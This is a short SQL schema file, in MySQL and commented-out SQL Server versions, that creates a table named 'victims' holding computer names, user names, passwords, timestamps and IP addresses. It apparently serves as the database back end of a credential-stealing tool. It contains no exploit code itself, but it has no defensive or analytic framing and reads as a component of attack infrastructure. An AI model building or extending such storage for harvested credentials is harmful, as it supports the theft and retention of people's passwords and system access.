-- Coded for MySQL DBMS for other DBMS this could change--

CREATE table victims (
    id_victim int NOT NULL AUTO_INCREMENT PRIMARY KEY,
    computer_name varchar (200) NOT NULL,
    user_name varchar (150) NOT NULL,
    password varchar (200) NOT NULL,
    date_time datetime NOT NULL default NOW(),
    ip text NOT NULL
    );

	
-- Microsoft SQL SERVER Script: --

/*
CREATE table victims (
    id_victim int IDENTITY (1,1) NOT NULL PRIMARY KEY,
    computer_name varchar (200) NOT NULL,
    user_name varchar (150) NOT NULL,
    password varchar (200) NOT NULL,
    date_time datetime NOT NULL DEFAULT getdate(),
    ip text NOT NULL
    );
*/